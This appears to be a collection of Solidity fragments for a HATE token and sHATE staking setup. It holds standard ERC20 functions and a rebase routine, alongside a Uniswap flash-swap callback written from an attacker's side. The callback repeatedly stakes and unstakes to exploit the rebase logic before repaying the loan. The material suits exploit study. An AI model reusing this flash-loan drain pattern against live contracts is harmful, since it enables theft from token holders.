function approve(address spender, uint256 amount) public virtual override returns (bool) {
    address owner = _msgSender();
    _approve(owner, spender, amount);
    return true;
}

function balanceOf(address account) public view virtual override returns (uint256) {
    return _balances[account];
}

function transfer(address to, uint256 amount) public virtual override returns (bool) {
    address owner = _msgSender();
    _transfer(owner, to, amount);
    return true;
}

function uniswapV2Call(address, /*sender*/ uint256 amount0, uint256, /*amount1*/ bytes calldata data) external {
    uint256 i = 0;
    while (i < uint8(data[0])) {
        uint256 balanceAttacker = HATE.balanceOf(address(this));
        HATEStaking.stake(address(this), balanceAttacker);
        uint256 sTokenBalance = sHATE.balanceOf(address(this));
        HATEStaking.unstake(address(this), sTokenBalance, true);
        i += 1;
    }
    HATE.transfer(address(HATE_ETH_Pair), uint256(amount0 * 1000 / 997) + 1);
}

function stake(
    address _to,
    uint256 _amount
) external;

function unstake(
    address _to,
    uint256 _amount
) external;

function transferFrom(
    address from,
    address to,
    uint256 amount
) public virtual override returns (bool) {
    address spender = _msgSender();
    _spendAllowance(from, spender, amount);
    _transfer(from, to, amount);
    return true;
}

function rebase(uint256 amount_, uint256 epoch_) public override onlyStakingContract returns (uint256) {
    uint256 rebaseAmount;
    uint256 circulatingSupply_ = circulatingSupply();
    if (amount_ == 0) {
        emit LogSupply(epoch_, _totalSupply);
        emit LogRebase(epoch_, 0, index());
        return _totalSupply;
    } else if (circulatingSupply_ > 0) {
        rebaseAmount = amount_ * _totalSupply / circulatingSupply_;
    } else {
        rebaseAmount = amount_;
    }

    _totalSupply = _totalSupply + rebaseAmount;

    if (_totalSupply > MAX_SUPPLY) {
        _totalSupply = MAX_SUPPLY;
    }

    _gonsPerFragment = TOTAL_GONS / _totalSupply;

    _storeRebase(circulatingSupply_, amount_, epoch_);

    return _totalSupply;
}

function totalSupply() public view virtual override returns (uint256) {
    return _totalSupply;
}

function circulatingSupply() public view override returns (uint256) {
    return
        _totalSupply - balanceOf(stakingContract);
}

function decimals() public view virtual override returns (uint8) {
    return 9;
}

